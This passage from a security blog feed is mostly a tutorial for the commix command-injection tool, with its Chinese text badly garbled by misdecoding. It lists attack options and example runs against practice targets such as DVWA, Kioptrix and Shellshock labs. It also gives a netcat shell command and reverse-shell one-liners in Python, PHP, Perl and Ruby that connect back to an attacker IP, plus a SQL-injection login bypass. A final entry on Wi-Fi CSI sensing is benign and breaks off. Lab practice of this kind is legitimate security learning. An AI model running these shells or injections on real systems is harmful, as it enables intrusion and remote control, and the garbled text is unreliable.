ã€€ã€€ç™»å½•å‚æ•°å’Œæ•°æ®ã€‚</span><br><span class="line">    --auth-type =AUTH ã€€ã€€HTTPè®¤è¯ç±»å‹ï¼ˆä¾‹å¦‚â€œåŸºæœ¬â€æˆ–â€œæ‘˜è¦â€ï¼‰ã€‚</span><br><span class="line">    --auth-cred =AUTH ã€€ã€€HTTPèº«ä»½éªŒè¯å‡­æ®ï¼ˆä¾‹å¦‚â€œadminï¼šadminâ€ï¼‰ã€‚</span><br><span class="line">    --ignore-401ã€€ã€€ã€€ã€€ã€€ å¿½ç•¥HTTPé”™è¯¯401ï¼ˆæœªæˆæƒï¼‰ã€‚</span><br><span class="line">    --force-sslã€€ã€€ã€€ã€€ã€€ã€€å¼ºåˆ¶ä½¿ç”¨SSL / HTTPSã€‚</span><br><span class="line"></span><br><span class="line">  æšä¸¾ï¼š</span><br><span class="line">    è¿™äº›é€‰é¡¹å¯ç”¨äºæšä¸¾ç›®æ ‡ä¸»æœºã€‚</span><br><span class="line">    --allã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ£€ç´¢ä¸€åˆ‡ã€‚</span><br><span class="line">    --current-userã€€ã€€ã€€ã€€ã€€ã€€ æ£€ç´¢å½“å‰ç”¨æˆ·åã€‚</span><br><span class="line">    --hostnameã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ£€ç´¢å½“å‰ä¸»æœºåã€‚</span><br><span class="line">    --is-rootã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦å…·æœ‰rootæƒé™ã€‚</span><br><span class="line">    --is-adminã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚</span><br><span class="line">    --sys-infoã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ£€ç´¢ç³»ç»Ÿä¿¡æ¯ã€‚</span><br><span class="line">    --usersã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ£€ç´¢ç³»ç»Ÿç”¨æˆ·ã€‚</span><br><span class="line">    --passwordsã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ£€ç´¢ç³»ç»Ÿç”¨æˆ·å¯†ç æ•£åˆ—ã€‚</span><br><span class="line">    --privilegesã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ£€ç´¢ç³»ç»Ÿç”¨æˆ·æƒé™ã€‚</span><br><span class="line">    --ps-versionã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ£€ç´¢PowerShellçš„ç‰ˆæœ¬å·ã€‚</span><br><span class="line"></span><br><span class="line">  æ–‡ä»¶è®¿é—®ï¼š</span><br><span class="line">    è¿™äº›é€‰é¡¹å¯ç”¨äºè®¿é—®ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚</span><br><span class="line">    --file-read = FILE ..ã€€ã€€ä»ç›®æ ‡ä¸»æœºè¯»å–æ–‡ä»¶ã€‚</span><br><span class="line">    --file-write = FIL ..ã€€ã€€å†™å…¥ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚</span><br><span class="line">    --file-upload = FI ..ã€€ã€€åœ¨ç›®æ ‡ä¸»æœºä¸Šä¸Šä¼ æ–‡ä»¶ã€‚</span><br><span class="line">    --file-dest = FILE ..ã€€ã€€å†™å…¥å’Œ/æˆ–ä¸Šä¼ åˆ°çš„ä¸»æœºçš„ç»å¯¹æ–‡ä»¶è·¯å¾„ã€‚</span><br><span class="line"></span><br><span class="line">  æ¨¡å—ï¼š</span><br><span class="line">    è¿™äº›é€‰é¡¹å¯ç”¨äºå¢åŠ æ£€æµ‹å’Œ/æˆ–æ³¨å°„èƒ½åŠ›ã€‚</span><br><span class="line">    --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;æ³¨å…¥æ¨¡å—ã€‚  ï¼ˆä¾‹å¦‚&apos;ip_src = 192.168.178.1ï¼Œip_dst = 192.168.178.3&apos;ï¼‰ã€‚</span><br><span class="line">    --dns-server = DNS ..â€œDNS exfiltrationâ€æ³¨å…¥æ¨¡å—ã€‚ã€€ã€€ï¼ˆç”¨äºDNSç­›é€‰æ”»å‡»çš„åŸŸåï¼‰ã€‚</span><br><span class="line">    --shellshockâ€œç‚®å¼¹â€æ³¨å°„æ¨¡å—ã€‚</span><br><span class="line">  æ³¨å°„ï¼š</span><br><span class="line">    è¿™äº›é€‰é¡¹å¯ç”¨äºæŒ‡å®šè¦æ’å…¥å’Œè¾“å…¥çš„å‚æ•°,æä¾›å®šåˆ¶æ³¨å…¥æœ‰æ•ˆè´Ÿè½½ã€‚</span><br><span class="line">    -p TEST_PARAMETERã€€ã€€ã€€ã€€å¯æµ‹è¯•å‚æ•°ã€‚</span><br><span class="line">    --suffix = SUFFIXã€€ã€€ã€€ã€€æ³¨å…¥æœ‰æ•ˆè´Ÿè½½åç¼€å­—ç¬¦ä¸²ã€‚</span><br><span class="line">    --prefix = PREFIXã€€ã€€ã€€ã€€æ³¨å…¥æœ‰æ•ˆè´Ÿè½½å‰ç¼€å­—ç¬¦ä¸²ã€‚</span><br><span class="line">    --technique = TECHã€€ã€€ã€€æŒ‡å®šè¦ä½¿ç”¨çš„è¿›æ ·æŠ€æœ¯ã€‚</span><br><span class="line">    --maxlen = MAXLENã€€ã€€ã€€ è®¾ç½®ä¸æ—¶é—´ç›¸å…³çš„æœ€å¤§è¾“å‡ºé•¿åº¦,æ³¨å°„æŠ€æœ¯ï¼ˆé»˜è®¤ï¼š10000å­—ç¬¦ï¼‰ã€‚</span><br><span class="line">    --delay = DELAYã€€ã€€ã€€ã€€ è®¾ç½®ä¸æ—¶é—´ç›¸å…³çš„æ³¨å…¥çš„è‡ªå®šä¹‰æ—¶é—´å»¶è¿Ÿæœ¯ï¼ˆé»˜è®¤ï¼š1ç§’ï¼‰ã€‚</span><br><span class="line">    --tmp-path = TMP_P ..  è®¾ç½®WebæœåŠ¡å™¨çš„ä¸´æ—¶ç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚</span><br><span class="line">    --root-dir = SRV_R ..  è®¾ç½®WebæœåŠ¡å™¨æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚</span><br><span class="line">    --alter-shell = AL ..  ä½¿ç”¨å¦ä¸€ä¸ªos-shellï¼ˆä¾‹å¦‚&apos;Python&apos;ï¼‰ã€‚</span><br><span class="line">    --os-cmd = OS_CMDã€€ã€€ã€€ æ‰§è¡Œå•ä¸ªæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</span><br><span class="line">    --os = OSã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€å°†åç«¯æ“ä½œç³»ç»Ÿå¼ºåˆ¶ä¸ºæ­¤å€¼ã€‚</span><br><span class="line">    --tamper = TAMPERã€€ã€€ã€€ä½¿ç”¨ç»™å®šè„šæœ¬ç¯¡æ”¹æ³¨å°„æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">  æ£€æµ‹ï¼š</span><br><span class="line">    è¿™äº›é€‰é¡¹å¯ç”¨äºè‡ªå®šä¹‰æ£€æµ‹é˜¶æ®µã€‚</span><br><span class="line"></span><br><span class="line">    --level = LEVELã€€ã€€è¦æ‰§è¡Œçš„æµ‹è¯•çº§åˆ«ï¼ˆ1-3ï¼Œé»˜è®¤å€¼ï¼š1ï¼‰ã€‚</span><br><span class="line">    --skip-calcã€€ã€€ã€€ã€€åœ¨æ£€æµ‹æœŸé—´è·³è¿‡æ•°å­¦è®¡ç®—</span><br><span class="line">    --dependenciesã€€ã€€æ£€æŸ¥ç¬¬ä¸‰æ–¹ï¼ˆéå†…æ ¸ï¼‰ä¾èµ–å…³ç³»ã€‚</span><br><span class="line">    --skip-wafã€€ã€€ã€€ã€€ç»•è¿‡å¯å‘å¼æ£€æµ‹WAF / IPS / IDSä¿æŠ¤ã€‚</span><br></pre></td></tr></table></figure><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">python commix.py â€“url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HEREâ€ --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234â€³</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Freebufç»™å‡ºçš„ä¸€äº›ç”¨æ³•ï¼ˆhttp://www.freebuf.com/sectool/64030.htmlï¼‰</span><br><span class="line"></span><br><span class="line">æµ‹è¯•æ¼æ´webåº”ç”¨Damn</span><br><span class="line"></span><br><span class="line">python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</span><br><span class="line">ä½¿ç”¨æ³¨å…¥æ”»å‡»Payloadå‚æ•°æµ‹è¯•php-Charts 1.0</span><br><span class="line"></span><br><span class="line">python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;</span><br><span class="line">ä½¿ç”¨ç‰¹æ®Šçš„å¤´å’ŒHTTPä»£ç†æµ‹è¯•OWASP Mutillidae</span><br><span class="line"></span><br><span class="line">python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</span><br><span class="line">ä½¿ç”¨ICMPæ¸—æ¼ï¼ˆexfiltrationï¼‰æŠ€æœ¯æµ‹è¯•Persistence</span><br><span class="line"></span><br><span class="line">su -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">é…åˆä¸€äº›åå¼¹shell</span><br><span class="line"></span><br><span class="line">1. Python-reverse-shell:</span><br><span class="line">ã€€ã€€python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\â€192.168.1.3\â€,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\â€/bin/sh\â€,\â€-i\â€]);â€™</span><br><span class="line">2. PHP-reverse-shell:</span><br><span class="line">ã€€ã€€php -r â€˜\$sock=fsockopen(\â€192.168.1.3\â€,1234);exec(\â€/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\â€);â€™</span><br><span class="line">3. Perl-reverse-shell:</span><br><span class="line">ã€€ã€€perl -e â€˜use Socket;\$i=\â€192.168.1.3\â€;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\â€tcp\â€));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\â€&gt;%26S\â€);open(STDOUT,\â€&gt;%26S\â€);open(STDERR,\â€&gt;%26S\â€);exec(\â€/bin/sh -i\â€);&#125;;â€™</span><br><span class="line">4. Ruby-reverse-shell:</span><br><span class="line">ã€€ã€€ruby -rsocket -e â€˜exit if fork;c=TCPSocket.new(\â€192.168.1.3\â€,1234);while(cmd=c.gets);IO.popen(cmd,\â€r\â€)&#123;|io|c.print io.read&#125;endâ€™</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h4&gt;&lt;p&gt;é¡¹ç›®åœ°å€ï¼š&lt;a href=&quot;https://github.com/stasinopoulos/commix&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>commixä½¿ç”¨ç¤ºä¾‹</title>
    <link href="http://zer0yu.github.io/2017/01/21/commix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/"/>
    <id>http://zer0yu.github.io/2017/01/21/commixä½¿ç”¨ç¤ºä¾‹/</id>
    <published>2017-01-21T14:53:57.000Z</published>
    <updated>2017-01-21T14:57:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-Exploiting-Damn-Vulnerable-Web-App"><a href="#1-Exploiting-Damn-Vulnerable-Web-App" class="headerlink" title="1. Exploiting Damn Vulnerable Web App:"></a>1. Exploiting <a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">Damn Vulnerable Web App</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</span><br></pre></td></tr></table></figure><h4 id="2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string"><a href="#2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string" class="headerlink" title="2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:"></a>2. Exploiting <a href="http://www.exploit-db.com/exploits/25496/" target="_blank" rel="noopener">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot;</span><br></pre></td></tr></table></figure><h4 id="3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy"><a href="#3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy" class="headerlink" title="3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:"></a>3. Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" target="_blank" rel="noopener">OWASP Mutillidae</a> using extra headers and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</span><br></pre></td></tr></table></figure><h4 id="4-Exploiting-Persistence-using-ICMP-exfiltration-technique"><a href="#4-Exploiting-Persistence-using-ICMP-exfiltration-technique" class="headerlink" title="4. Exploiting Persistence using ICMP exfiltration technique:"></a>4. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="noopener">Persistence</a> using ICMP exfiltration technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;</span><br></pre></td></tr></table></figure><h4 id="5-Exploiting-Persistence-using-an-alternative-python-shell"><a href="#5-Exploiting-Persistence-using-an-alternative-python-shell" class="headerlink" title="5. Exploiting Persistence using an alternative (python) shell:"></a>5. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="noopener">Persistence</a> using an alternative (python) shell:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --alter-shell=&quot;Python&quot;</span><br></pre></td></tr></table></figure><h4 id="6-Exploiting-Kioptrix-Level-1-1-2"><a href="#6-Exploiting-Kioptrix-Level-1-1-2" class="headerlink" title="6. Exploiting Kioptrix: Level 1.1 (#2):"></a>6. Exploiting <a href="http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar" target="_blank" rel="noopener">Kioptrix: Level 1.1 (#2)</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.2/pingit.php&quot; --data=&quot;ip=127.0.0.1E&amp;submit=submit&quot; --auth-url=&quot;http://192.168.178.2/index.php&quot; --auth-data=&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot;</span><br></pre></td></tr></table></figure><h4 id="7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique"><a href="#7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique" class="headerlink" title="7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:"></a>7. Exploiting <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank" rel="noopener">Kioptrix: 2014 (#5)</a> using custom user-agent and specified injection technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot; --user-agent=&quot;Mozilla/4.0 Mozilla4_browser&quot; --technique=&quot;f&quot; --root-dir=&quot;/&quot;</span><br></pre></td></tr></table></figure><h4 id="8-Exploiting-CVE-2014-6271-Shellshock"><a href="#8-Exploiting-CVE-2014-6271-Shellshock" class="headerlink" title="8. Exploiting CVE-2014-6271/Shellshock:"></a>8. Exploiting <a href="https://pentesterlab.com/exercises/cve-2014-6271" target="_blank" rel="noopener">CVE-2014-6271/Shellshock</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.4/cgi-bin/status/&quot; --shellshock</span><br></pre></td></tr></table></figure><h4 id="9-Exploiting-commix-testbed-cookie-using-cookie-based-injection"><a href="#9-Exploiting-commix-testbed-cookie-using-cookie-based-injection" class="headerlink" title="9. Exploiting commix-testbed (cookie) using cookie-based injection:"></a>9. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/cookie" target="_blank" rel="noopener">commix-testbed (cookie)</a> using cookie-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot; --cookie=&quot;addr=127.0.0.1&quot;</span><br></pre></td></tr></table></figure><h4 id="10-Exploiting-commix-testbed-user-agent-using-ua-based-injection"><a href="#10-Exploiting-commix-testbed-user-agent-using-ua-based-injection" class="headerlink" title="10. Exploiting commix-testbed (user-agent) using ua-based injection:"></a>10. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/user-agent" target="_blank" rel="noopener">commix-testbed (user-agent)</a> using ua-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot; --level=3</span><br></pre></td></tr></table></figure><h4 id="11-Exploiting-commix-testbed-referer-using-referer-based-injection"><a href="#11-Exploiting-commix-testbed-referer-using-referer-based-injection" class="headerlink" title="11. Exploiting commix-testbed (referer) using referer-based injection:"></a>11. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/referer" target="_blank" rel="noopener">commix-testbed (referer)</a> using referer-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot; --level=3</span><br></pre></td></tr></table></figure><h4 id="12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option"><a href="#12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option" class="headerlink" title="12. Exploiting Flick 2 using custom headers and base64 encoding option:"></a>12. Exploiting <a href="https://www.vulnhub.com/entry/flick-2,122/" target="_blank" rel="noopener">Flick 2</a> using custom headers and base64 encoding option:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64</span><br></pre></td></tr></table></figure><h4 id="13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data"><a href="#13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data" class="headerlink" title="13. Exploiting commix-testbed (JSON-based) using JSON POST data:"></a>13. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/scenarios/regular/POST" target="_blank" rel="noopener">commix-testbed (JSON-based)</a> using JSON POST data:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><h4 id="14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy"><a href="#14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy" class="headerlink" title="14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:"></a>14. Exploiting <a href="https://www.vulnhub.com/entry/sickos-11,132/" target="_blank" rel="noopener">SickOs 1.1</a> using shellshock module and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-Exploiting-Damn-Vulnerable-Web-App&quot;&gt;&lt;a href=&quot;#1-Exploiting-Damn-Vulnerable-Web-App&quot; class=&quot;headerlink&quot; title=&quot;1. Exploiting Damn V
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>åŸºäºCSIçš„ç§»åŠ¨ç›®æ ‡ä¾¦æµ‹ç ”ç©¶å­¦ä¹ </title>
    <link href="http://zer0yu.github.io/2017/01/21/%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zer0yu.github.io/2017/01/21/åŸºäºCSIçš„ç§»åŠ¨ç›®æ ‡ä¾¦æµ‹ç ”ç©¶å­¦ä¹ /</id>
    <published>2017-01-21T14:48:58.000Z</published>
    <updated>2017-01-23T03:12:15.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…" class="headerlink" title="ç¯å¢ƒå®‰è£…"></a>ç¯å¢ƒå®‰è£…</h4><p>éœ€è¦ç”¨åˆ°<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="noopener">CSI tool</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨Ubuntuä¸Šçš„åˆ©ç”¨Intel Wi-Fi Wireless Link 5300 802.11næ¥åšåˆ†æçš„ç¨‹åºã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨ä½œè€…ç½‘ç«™ä¸­æ–¹æ³•æ¥å®‰è£…ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="noopener">æ¸…åçš„ç‰ˆæœ¬</a>ã€‚æ¸…åçš„ç‰ˆæœ¬é™„å¸¦äº†å®‰è£…è¯´æ˜ä¹¦ï¼Œå‚è€ƒè¯´æ˜ä¹¦ä¸Šçš„æ–¹æ³•ï¼Œå®‰è£…å³å¯ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‘å°„æºè·¯ç”±å™¨éœ€è¦é€‰æ‹©å•å¤©çº¿æ”¯æŒ802.11nçš„è·¯ç”±å™¨ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯TP-LINK TL-WR742Nã€‚</p><h4 id="è·å–æ•°æ®"><a href="#è·å–æ•°æ®" class="headerlink" title="è·å–æ•°æ®"></a>è·å–æ•°æ®</h4><p>cdè¿›å…¥csitoolsæ–‡ä»¶å¤¹ï¼Œè¿›å…¥linux-80211n-csitool-supplementary/netlinkï¼Œè¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./log_to_file tmp.dat</span><br></pre></td></tr></table></figure><p>æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯ï¼Œè¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1 -i 0.2</span><br></pre></td></tr></table></figure><p>netlinkæ–‡ä»¶å¤¹ä¸­çš„tmp.datå°±æ˜¯é‡‡é›†çš„åŸå§‹æ•°æ®ã€‚</p><h4 id="è¯»å–æ•°æ®"><a href="#è¯»å–æ•°æ®" class="headerlink" title="è¯»å–æ•°æ®"></a>è¯»å–æ•°æ®</h4><p>ä½¿ç”¨Matlabè¯»å–æ•°æ®ï¼Œè¿›å…¥linux-80211n-csitool-supplementary/matlabæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨read_bf_fileå‡½æ•°å¯ä»¥è¯»å–æ•°æ®ã€‚</p><p>ä¸€ä¸ªä¾‹å­æ•°æ®åŒ…é‡ŒåŒ…å«</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">timestamp_low: <span class="number">4</span> (In the sample trace, timestamp_low is invalid and always <span class="number">4.</span>)</span><br><span class="line">bfee_count: <span class="number">72</span></span><br><span class="line">Nrx: <span class="number">3</span></span><br><span class="line">Ntx: <span class="number">1</span></span><br><span class="line">rssi_a: <span class="number">33</span></span><br><span class="line">rssi_b: <span class="number">37</span></span><br><span class="line">rssi_c: <span class="number">41</span></span><br><span class="line">noise: <span class="number">-127</span></span><br><span class="line">agc: <span class="number">38</span></span><br><span class="line">perm: [<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line">rate: <span class="number">256</span></span><br><span class="line">csi: [<span class="number">1</span>x3x30 double]</span><br></pre></td></tr></table></figure><ul><li><strong>timestamp_low</strong> æ˜¯æ—¶é—´æˆ³</li><li><strong>bfee_count</strong> æ•°æ®åŒ…æ•°é‡</li><li><strong>Nrx,Ntx</strong> åˆ†åˆ«è¡¨ç¤ºæ¥æ”¶ç«¯å’Œå‘é€ç«¯çš„å¤©çº¿æ•°é‡</li><li><strong>rssi_a, rssi_b, rssi_c</strong> æ¯ä¸ªå¤©çº¿çš„RSSIæ•°æ®ï¼Œå•ä½dBï¼Œ</li><li><strong>agc</strong> Automatic Gain Control</li><li><strong>perm</strong> NICé‡æ’åˆ—åçš„é¡ºåºç»“æœï¼Œä»£è¡¨RFé“¾è·¯çš„é¡ºåº</li><li><strong>rate</strong> å‘é€åŒ…çš„rate</li><li><strong>csi</strong> CSIåŸå§‹æ•°æ®ï¼Œæ˜¯ä¸ªNtxÃ—NrxÃ—30å¤æ•°çŸ©é˜µ</li></ul><p>ä¸»è¦æå–å‡ºCSIæ•°æ®å’Œtimestamp_lowã€‚</p><h4 id="æ•°æ®é¢„å¤„ç†"><a href="#æ•°æ®é¢„å¤„ç†" class="headerlink" 